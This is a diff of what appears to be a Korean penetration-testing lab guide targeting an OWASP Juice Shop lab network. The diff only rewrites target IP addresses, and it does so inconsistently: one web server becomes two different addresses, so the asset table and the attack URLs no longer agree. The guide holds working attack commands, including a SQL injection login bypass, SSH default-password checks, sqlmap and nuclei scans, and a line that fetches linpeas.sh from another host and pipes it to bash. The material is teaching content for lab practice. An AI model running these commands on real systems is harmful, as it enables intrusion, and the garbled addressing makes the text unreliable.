@@ -103,14 +103,14 @@ nmap -sn 10.20.30.0/24 2>/dev/null | grep "report\|Host is"
 
 echo ""
 echo "[2] 서비스 열거 (포트/버전)"
-for host in 10.20.30.1 10.20.30.80 10.20.30.100 10.20.30.201; do
+for host in 10.20.30.1 10.20.32.80 10.20.30.100 10.20.30.201; do
   echo "--- $host ---"
   nmap -sV --open -p 22,80,443,3000,5432,8000,8001,8002,9200 "$host" 2>/dev/null | grep "open"
 done
 
 echo ""
 echo "[3] 웹 서비스 핑거프린팅"
-for target in "10.20.30.80:80" "10.20.30.80:3000" "10.20.30.201:8000"; do
+for target in "10.20.32.80:80" "10.20.40.81:3000" "10.20.30.201:8000"; do
   echo "--- $target ---"
   curl -sI "http://$target/" 2>/dev/null | grep -iE "server:|x-powered|content-type" | head -3
 done
@@ -122,7 +122,7 @@ cat << 'ASSETS'
 | 자산     | IP             | 서비스            | 가치     |
 +----------------------------------------------------------+
 | secu     | 10.20.30.1     | 방화벽, IPS      | 매우 높음 |
-| web      | 10.20.30.80    | 웹서버, JuiceShop| 중간      |
+| web      | 10.20.32.80    | 웹서버, JuiceShop| 중간      |
 | siem     | 10.20.30.100   | Wazuh SIEM      | 높음       |
 | bastion  | 10.20.30.201   | 컨트롤플레인     | 매우 높음 |
 +----------------------------------------------------------+
@@ -160,7 +160,7 @@ echo "============================================================"
 echo ""
 echo "[취약점 1] Juice Shop SQL Injection"
 echo "--- 테스트 ---"
-SQLI_RESULT=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+SQLI_RESULT=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d "{\"email\":\"' OR 1=1--\",\"password\":\"a\"}" 2>/dev/null)
 
@@ -175,7 +175,7 @@ fi
 echo ""
 echo "[취약점 2] 민감 경로 노출"
 for path in "/ftp" "/api/Users" "/api/Challenges" "/rest/products/search?q="; do
-  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$path" 2>/dev/null)
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.40.81:3000$path" 2>/dev/null)
   if [ "$CODE" = "200" ]; then
     echo "  [+] $path → HTTP $CODE (접근 가능)"
   fi
@@ -183,7 +183,7 @@ done
 
 echo ""
 echo "[취약점 3] SubAgent API 접근"
-SUBAGENT=$(curl -s http://10.20.30.80:8002/ 2>/dev/null)
+SUBAGENT=$(curl -s http://10.20.32.80:8002/ 2>/dev/null)
 if [ -n "$SUBAGENT" ]; then
   echo "  [+] SubAgent API 접근 가능"
   echo "  응답: ${SUBAGENT:0:100}"
@@ -197,7 +197,7 @@ for user in web secu siem; do
     echo "  [+] $user → 비밀번호 '1'로 SSH 접근 성공"
   fi
 done
-ssh "ccc@10.20.30.80" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.80 → SSH 접근 성공"
+ssh "ccc@10.20.32.80" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.32.80 → SSH 접근 성공"
 ssh "ccc@10.20.30.1" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.1 → SSH 접근 성공"
 ssh "ccc@10.20.30.100" "echo success" 2>/dev/null && echo "  [+] ccc@10.20.30.100 → SSH 접근 성공"
 
@@ -313,7 +313,7 @@ cat << 'REPORT'
 
 2. 범위와 방법론
    방법론: PTES (Penetration Testing Execution Standard)
-   범위: secu(10.20.30.1), web(10.20.30.80),
+   범위: secu(10.20.30.1), web(10.20.32.80),
          siem(10.20.30.100), bastion(10.20.30.201)
    제한: DoS 공격 금지, 데이터 변조 금지
 
@@ -321,7 +321,7 @@ cat << 'REPORT'
 
    [VULN-001] SQL Injection — Juice Shop 로그인
    위험도: Critical (CVSS 9.8)
-   위치: http://10.20.30.80:3000/rest/user/login
+   위치: http://10.20.40.81:3000/rest/user/login
    영향: 인증 우회, 전체 사용자 데이터 접근
    재현: POST {"email":"' OR 1=1--","password":"a"}
    권고: 파라미터화된 쿼리 사용, WAF 규칙 강화
@@ -335,13 +335,13 @@ cat << 'REPORT'
 
    [VULN-003] 민감 API 무인증 접근
    위험도: High (CVSS 7.5)
-   위치: http://10.20.30.80:3000/api/Users
+   위치: http://10.20.40.81:3000/api/Users
    영향: 사용자 목록, 이메일 주소 유출
    권고: API 인증 강제, 접근 제어
 
    [VULN-004] SubAgent API 노출
    위험도: High (CVSS 7.8)
-   위치: http://10.20.30.80:8002
+   위치: http://10.20.32.80:8002
    영향: 원격 명령 실행 가능
    권고: 인증 추가, 네트워크 접근 제한
 
@@ -477,7 +477,7 @@ cat << 'NARRATIVE'
   서비스(SSH, HTTP, API)를 식별했다.
 
 [09:15] 초기 접근 — SQL Injection
-  web 서버(10.20.30.80)에서 Juice Shop 웹 애플리케이션을 발견했다.
+  web 서버(10.20.32.80)에서 Juice Shop 웹 애플리케이션을 발견했다.
   로그인 API(/rest/user/login)에 SQL Injection 취약점이 존재하여,
   조작된 이메일 주소(' OR 1=1--)로 관리자 인증을 우회했다.
   관리자 JWT 토큰을 획득하여 전체 사용자 목록에 접근했다.
@@ -830,17 +830,17 @@ nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon-1k
 # -sV 서비스 버전, -sC default scripts, --open 열린 포트만, -oA 모든 형식 저장
 
 # === Stage 3: 전체 포트 (느림) ===
-nmap -sS -p- --min-rate=1000 -T4 10.20.30.80 -oA /tmp/recon-full
+nmap -sS -p- --min-rate=1000 -T4 10.20.32.80 -oA /tmp/recon-full
 # 또는 rustscan 으로 빠르게 발견 후 nmap 으로 deep
-rustscan -a 10.20.30.80 -- -sV -sC -oA /tmp/recon-rs
+rustscan -a 10.20.32.80 -- -sV -sC -oA /tmp/recon-rs
 
 # === Stage 4: NSE 깊이 ===
-nmap --script vuln 10.20.30.80 -oA /tmp/recon-vuln
-nmap --script smb-vuln-* -p 445 10.20.30.80
-nmap --script http-* -p 80,443 10.20.30.80
+nmap --script vuln 10.20.32.80 -oA /tmp/recon-vuln
+nmap --script smb-vuln-* -p 445 10.20.32.80
+nmap --script http-* -p 80,443 10.20.32.80
 
 # === Stage 5: OS fingerprint + Traceroute ===
-nmap -O --traceroute 10.20.30.80 -oA /tmp/recon-os
+nmap -O --traceroute 10.20.32.80 -oA /tmp/recon-os
 # OS detection: Linux 5.15 / Windows Server 2019
 
 # 결과 정리
@@ -860,22 +860,22 @@ theHarvester -d corp.example -b google,linkedin -l 500
 
 ```bash
 # 기본 — 모든 template
-nuclei -u http://10.20.30.80:3000
+nuclei -u http://10.20.40.81:3000
 
 # 카테고리별
-nuclei -u http://10.20.30.80:3000 -t cves/                 # CVE 만
-nuclei -u http://10.20.30.80:3000 -t exposures/             # 시크릿/설정 노출
-nuclei -u http://10.20.30.80:3000 -t vulnerabilities/       # 일반 취약점
-nuclei -u http://10.20.30.80:3000 -t misconfiguration/      # 잘못된 설정
-nuclei -u http://10.20.30.80:3000 -t default-logins/        # 기본 자격증명
-nuclei -u http://10.20.30.80:3000 -t takeovers/             # 서브도메인 인수
+nuclei -u http://10.20.40.81:3000 -t cves/                 # CVE 만
+nuclei -u http://10.20.40.81:3000 -t exposures/             # 시크릿/설정 노출
+nuclei -u http://10.20.40.81:3000 -t vulnerabilities/       # 일반 취약점
+nuclei -u http://10.20.40.81:3000 -t misconfiguration/      # 잘못된 설정
+nuclei -u http://10.20.40.81:3000 -t default-logins/        # 기본 자격증명
+nuclei -u http://10.20.40.81:3000 -t takeovers/             # 서브도메인 인수
 
 # severity 필터
-nuclei -u http://10.20.30.80:3000 -severity critical,high
-nuclei -u http://10.20.30.80:3000 -severity high,critical -markdown-export /tmp/nuclei-report
+nuclei -u http://10.20.40.81:3000 -severity critical,high
+nuclei -u http://10.20.40.81:3000 -severity high,critical -markdown-export /tmp/nuclei-report
 
 # 다중 target
-echo -e "10.20.30.80\n10.20.30.100\n10.20.30.1" > targets.txt
+echo -e "10.20.32.80\n10.20.30.100\n10.20.30.1" > targets.txt
 nuclei -l targets.txt -t cves/ -o /tmp/scan.txt
 
 # 사용자 정의 template
@@ -893,24 +893,24 @@ http:
       - type: word
         words: ["admin", "Admin"]
 YML
-nuclei -u http://10.20.30.80:3000 -t custom.yaml
+nuclei -u http://10.20.40.81:3000 -t custom.yaml
 
 # === ffuf — 디렉터리 fuzzing ===
 ffuf -w /usr/share/wordlists/dirb/common.txt \
-  -u http://10.20.30.80:3000/FUZZ \
+  -u http://10.20.40.81:3000/FUZZ \
   -mc 200,301,302,403 -fc 404 \
   -o /tmp/ffuf.json -of json
 
 # 파라미터 fuzzing
 ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
-  -u "http://10.20.30.80:3000/api/users?FUZZ=admin" \
+  -u "http://10.20.40.81:3000/api/users?FUZZ=admin" \
   -fs 1234   # 정상 응답 크기
 
 # === sqlmap ===
-sqlmap -u "http://10.20.30.80:3000/rest/products/search?q=*" \
+sqlmap -u "http://10.20.40.81:3000/rest/products/search?q=*" \
   --batch --random-agent --threads=4
 
-sqlmap -u "http://10.20.30.80:3000/login" \
+sqlmap -u "http://10.20.40.81:3000/login" \
   --data="email=test&password=test" \
   --dbs --batch
 
@@ -1094,7 +1094,7 @@ PY
 cat > /tmp/chain.mmd << 'M'
 sequenceDiagram
   participant A as Attacker
-  participant W as Web (10.20.30.80)
+  participant W as Web (10.20.32.80)
   participant S as SIEM (10.20.30.100)
   participant F as Firewall (10.20.30.1)
 
@@ -1265,21 +1265,21 @@ EOF
 # 정찰
 masscan -p1-65535 10.20.30.0/24 --rate=10000 -oG /tmp/masscan.gnmap
 nmap -sV -sC --top-ports 1000 --open 10.20.30.0/24 -oA /tmp/recon
-nikto -h http://10.20.30.80 -o /tmp/nikto.txt
-nuclei -u http://10.20.30.80:3000 -severity high,critical -o /tmp/nuclei.txt
+nikto -h http://10.20.32.80 -o /tmp/nikto.txt
+nuclei -u http://10.20.40.81:3000 -severity high,critical -o /tmp/nuclei.txt
 ```
 
 #### Phase B — Exploitation + Post-Ex (s6·s7·s8·s9·s10)
 
 ```bash
 # 1. 웹 초기 접근 (Juice Shop)
-sqlmap -u "http://10.20.30.80:3000/rest/user/login" --data='{"email":"x","password":"y"}' \
+sqlmap -u "http://10.20.40.81:3000/rest/user/login" --data='{"email":"x","password":"y"}' \
   --batch --random-agent --threads=4
 
 # admin token (JWT none)
 curl -X POST -H "Content-Type: application/json" \
   -d '{"email":"admin@juice-sh.op","password":"x"}' \
-  http://10.20.30.80:3000/rest/user/login
+  http://10.20.40.81:3000/rest/user/login
 
 # 2. 시스템 enum (admin 으로 webshell upload 후)
 curl -s 10.20.30.201:8000/linpeas.sh | bash > /tmp/linpeas.out
